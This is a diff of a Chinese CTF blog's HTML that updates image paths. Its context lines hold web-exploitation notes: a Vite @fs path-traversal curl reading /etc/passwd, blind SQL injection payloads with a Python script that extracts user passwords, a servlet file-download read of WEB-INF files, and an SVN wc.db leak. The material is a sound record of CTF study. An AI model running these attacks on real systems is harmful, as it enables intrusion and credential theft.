@@ -228,7 +228,7 @@
 <p>###TGCTF WEB-前端GAME Ultra</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">访问/@fs/tmp/获得绝对路径/app，同时给了附件看docker也能看出路径</span><br><span class="line">curl --request-target /@fs/app/#/../../../../../etc/passwd </span><br><span class="line">http://node1.tgctf.woooo.tech:32742/</span><br><span class="line"> curl --request-target /@fs/app/#/../../../../../tgflagggg </span><br><span class="line">http://node2.tgctf.woooo.tech:31500/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/image-20250421203653806.png" alt="image-20250421203653806"></p>
+<p><img src="/2025/04/21/ViteCVE/image-20250421203653806.png" alt="image-20250421203653806"></p>
 
       
     </div>
@@ -305,7 +305,7 @@
 
 <h3 id="布尔盲注的一般流程"><a href="#布尔盲注的一般流程" class="headerlink" title="布尔盲注的一般流程"></a>布尔盲注的一般流程</h3><p>因为盲注不能直接用database（）函数得到数据库名，所以步骤如下：<br>①判断数据库名的长度：<strong>and length(database())&gt;11</strong> 回显正常；**and length(database())&gt;12 **回显错误，说明数据库名是等于12个字符。<br>②猜测数据库名（使用ascii码来依次判断）：**and (ascii(substr(database(),1,1)))&gt;100 –+ **通过不断测试，确定ascii值，查看asciii表可以得出该字符，通过改变database（）后面第一个数字，可以往后继续猜测第二个、第三个字母…<br>③猜测表名：**and (ascii(substr((select table_name from information_schema.tables where table.schema&#x3D;database() limit 1,1)1,1)&gt;144 –+ **往后继续猜测第二个、第三个字母…<br>④猜测字段名（列名）：**and (ascii(substr((select column_name from information_schema.columns where table.schema&#x3D;database() and table_name&#x3D;’数据库表名’ limit 0,1)1,1)&gt;105 –+ **经过猜测 ascii为 105 为i 也就是表的第一个列名 id的第一个字母;同样,通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段.<br>⑤猜测字段内容：因为知道了列名，所以直接 select password from users 就可以获取password里面的内容，username也一样 <strong>and (ascii(substr(( select password from users limit 0,1),1,1)))&#x3D;68–+</strong></p>
 <h4 id="eg"><a href="#eg" class="headerlink" title="eg"></a>eg</h4><p><strong>遇见这样的界面 可以先扫目录</strong> </p>
-<p><img src="/image-20250419155825900.png" alt="image-20250419155825900"></p>
+<p><img src="/2025/04/19/SQL/image-20250419155825900.png" alt="image-20250419155825900"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=&quot;http://43.249.195.138:22649/&quot;</span><br><span class="line">result=&quot;&quot;</span><br><span class="line">op = &quot;&quot;</span><br><span class="line">for i in range(1,50000):  </span><br><span class="line">    l=int(0)</span><br><span class="line">    r=int(128)</span><br><span class="line">    while l&lt;r:</span><br><span class="line">        j=(l+r)&gt;&gt;1</span><br><span class="line">        payload0=&#123;</span><br><span class="line">            &quot;username&quot;: f&quot;admin&#x27; and ascii(substr((select password from users),&#123;i&#125;,1))&gt; &#123;j&#125;#&quot;,</span><br><span class="line">            &quot;password&quot;:&quot;1&quot;,</span><br><span class="line">            &quot;submit&quot;:&quot;%E7%99%BB%E5%BD%95&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        result =requests.post(url=url,data=payload0)</span><br><span class="line">        if (&#x27;用户名或密码错误&#x27; in result.text):</span><br><span class="line">            r=j</span><br><span class="line">        else:</span><br><span class="line">            l=j+1</span><br><span class="line">    op+=chr(l)</span><br><span class="line">    print(op)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and length(database()) &gt; 1#爆破当前数据库长度</span><br></pre></td></tr></table></figure>
@@ -764,7 +764,7 @@
 <p>(2)通过在<strong>web.xml</strong>文件的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/DownloadServlet?filename=/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
 
-<p><img src="/JavaWeb--%E6%B7%B1%E5%85%A5Servlet/image-20250417205855534.png" alt="image-20250417205855534"></p>
+<p><img src="/2025/04/16/JavaWeb--%E6%B7%B1%E5%85%A5Servlet/image-20250417205855534.png" alt="image-20250417205855534"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/DownloadServlet?filename=/WEB-INF/classes/com/ctf/flag/FlagManager.class</span><br></pre></td></tr></table></figure>
 
 <p>(用POST传参将Class文件下载下来)</p>
@@ -888,10 +888,10 @@
 <p>2、实际工作过程中，可以使用 dirsearch 进行路径扫描：</p>
 <p><img src="https://i-blog.csdnimg.cn/blog_migrate/a617af9619c5791295e4c760102093ce.png#pic_center" alt="img"></p>
 <p>3、下载并分析 wc.db 文件：</p>
-<h4 id="eg-1"><a href="#eg-1" class="headerlink" title="eg.1"></a>eg.1</h4><p><img src="/SVN%E6%BC%8F%E6%B4%9E/image-20250510192632768.png" alt="image-20250510192632768"></p>
-<p><img src="/SVN%E6%BC%8F%E6%B4%9E/image-20250510192759257.png" alt="image-20250510192759257"></p>
+<h4 id="eg-1"><a href="#eg-1" class="headerlink" title="eg.1"></a>eg.1</h4><p><img src="/2025/04/01/SVN%E6%BC%8F%E6%B4%9E/image-20250510192632768.png" alt="image-20250510192632768"></p>
+<p><img src="/2025/04/01/SVN%E6%BC%8F%E6%B4%9E/image-20250510192759257.png" alt="image-20250510192759257"></p>
 <p>点进去57 再点就能看到flag</p>
-<p><img src="/SVN%E6%BC%8F%E6%B4%9E/image-20250510192837113.png" alt="image-20250510192837113"></p>
+<p><img src="/2025/04/01/SVN%E6%BC%8F%E6%B4%9E/image-20250510192837113.png" alt="image-20250510192837113"></p>
 
       
     </div>
